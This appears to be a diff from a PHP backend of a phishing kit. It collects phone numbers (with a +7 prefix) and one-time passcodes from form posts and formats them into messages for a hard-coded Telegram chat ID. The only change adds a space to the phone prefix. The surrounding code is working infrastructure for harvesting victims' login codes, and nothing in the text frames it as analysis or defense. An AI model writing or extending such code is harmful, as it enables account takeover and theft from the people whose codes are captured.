@@ -8,7 +8,7 @@ $TELEGRAM_CHAT_ID = "7006724996";
 
 if ($type === "phone") {
     $random = $_POST["random"];
-    $phone = "+7" . $_POST["phone"];
+    $phone = "+7 " . $_POST["phone"];
     $message = "#" . $random . "\nPhone: " . $phone;
 } else if ($type === "otp") {
     $random = $_POST["random"];
